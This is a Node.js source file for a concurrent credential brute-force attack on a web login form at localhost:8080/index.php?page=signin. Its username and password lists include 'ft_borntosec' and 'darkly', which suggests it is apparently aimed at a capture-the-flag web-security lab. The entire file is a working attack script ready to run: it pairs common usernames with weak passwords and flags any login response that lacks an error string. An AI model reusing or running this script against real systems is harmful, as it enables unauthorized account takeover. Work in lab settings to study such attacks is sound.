// To run this:
// 1. Make sure you have Node.js installed.
// 3. Run: 'node brute-force.js'

const http = require("http");

// --- Configuration ---
const TARGET_HOST = "localhost";
const TARGET_PORT = 8080;
const TARGET_PATH = "/index.php";
const PARAM = "page=signin";
const CONCURRENT_LIMIT = 50; // Max number of requests to run at the same time

// --- Test Data (Credentials) ---
const USERS = [
  "admin",
  "adm",
  "user",
  "test",
  "guest",
  "root",
  "superuser",
  "administrator",
  "ft_borntosec",
  "born2sec",
  "flag",
  "darkly",
  "webmaster",
  "support",
  "sysadmin",
  "operator",
  "moderator",
  "manager",
  "developer",
  "tester",
  "debug",
  "demo",
  "changeme",
  "your_username",
  "yourusername",
  "default",
  "backup",
  "service",
  "www",
  "web",
  "apache",
  "nginx",
  "mysql",
  "postgres",
  "database",
  "system",
  "master",
];

const PASSWORDS = [
  "password123",
  "admin",
  "letmein",
  "abc123",
  "password1",
  "iloveyou",
  "4242",
  "1111",
  "0000",
  "darkly",
  "ft_borntosec",
  "password",
  "1234",
  "12345",
  "123456",
  "1234567",
  "12345678",
  "123456789",
  "welcome",
  "qwerty",
  "azerty",
  "flag",
  "admin123",
  "root123",
  "pass123",
  "test123",
  "changeme",
  "your_password",
  "yourpassword",
  "default",
  "secret",
  "debug",
  "P@ssw0rd",
  "passw0rd",
  "Password1",
  "monkey",
  "sunshine",
  "shadow",
  "master",
  "shadow",
  "111111",
  "000000",
  "123123",
  "654321",
  "qwertyuiop",
  "asdfghjkl",
  "zxcvbnm",
  "access",
  "login",
  "batman",
  "dragon",
  "starwars",
  "football",
  "soccer",
];

// --- Semaphore Implementation (Concurrency Control) ---
class Semaphore {
  constructor(limit) {
    this.tickets = limit;
    this.waiters = [];
  }

  async acquire() {
    if (this.tickets > 0) {
      this.tickets--;
      return Promise.resolve();
    }
    return new Promise((resolve) => {
      this.waiters.push(resolve);
    });
  }

  release() {
    this.tickets++;
    if (this.waiters.length > 0) {
      const next = this.waiters.shift();
      if (next) {
        this.tickets--;
        next();
      }
    }
  }
}

// --- Core Functions ---

/**
 * Sends an HTTP request and returns the response body as a string.
 */
function sendRequest(path) {
  const options = {
    hostname: TARGET_HOST,
    port: TARGET_PORT,
    path: path,
    method: "GET",
    timeout: 5000,
  };

  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => {
        data += chunk;
      });
      res.on("end", () => {
        if (res.statusCode && res.statusCode >= 200 && res.statusCode < 300) {
          resolve(data);
        } else {
          resolve("");
        }
      });
    });

    req.on("error", (e) => {
      resolve("");
    });

    req.on("timeout", () => {
      req.destroy();
      resolve("");
    });

    req.end();
  });
}

/**
 * Fetches the response for an invalid (base) login attempt.
 */
async function fetchBaseResponse() {
  console.log("[*] Fetching base response for comparison...");
  const baseQuery = `${TARGET_PATH}?${PARAM}&username=invalid_user&password=invalid_password&Login=Login`;
  const response = await sendRequest(baseQuery);
  if (!response) {
    console.error(
      "[!] Failed to fetch base response. Target might be down or unreachable."
    );
    process.exit(1);
  }
  return response;
}

/**
 * Checks a single username/password combination.
 */
async function checkCredentials(
  semaphore,
  user,
  password,
  baseResponse,
  totalAttempts,
  counter
) {
  await semaphore.acquire();

  try {
    const queryPath = `${TARGET_PATH}?${PARAM}&username=${encodeURIComponent(
      user
    )}&password=${encodeURIComponent(password)}&Login=Login`;
    const responseText = await sendRequest(queryPath);

    if (!responseText.includes("WrongAnswer") && responseText.length > 0) {
      console.log(
        `\n[+] Found possible valid credentials: Username='${user}' Password='${password}'`
      );
    }
  } catch (e) {
    // Error handling
  } finally {
    semaphore.release();
  }

  process.stderr.write(`\r[*] Testing attempt ${counter}/${totalAttempts}...`);
}

async function main() {
  console.log(`=== Credential Brute Test (Node.js) ===`);
  console.log(
    `Target: http://${TARGET_HOST}:${TARGET_PORT}${TARGET_PATH}?${PARAM}`
  );
  console.log(`Concurrent Limit: ${CONCURRENT_LIMIT}`);
  console.log("======================================================");

  const baseResponse = await fetchBaseResponse();
  const semaphore = new Semaphore(CONCURRENT_LIMIT);
  const tasks = [];
  const totalAttempts = USERS.length * PASSWORDS.length;
  let counter = 0;

  console.log(
    `[*] Starting brute-force attack with ${totalAttempts} attempts...`
  );

  for (const user of USERS) {
    for (const password of PASSWORDS) {
      counter++;
      const task = checkCredentials(
        semaphore,
        user,
        password,
        baseResponse,
        totalAttempts,
        counter
      );
      tasks.push(task);
    }
  }

  await Promise.all(tasks);

  console.log("\n[*] Testing complete.");
}

main().catch((error) => {
  console.error(`\n[FATAL ERROR]`, error);
});
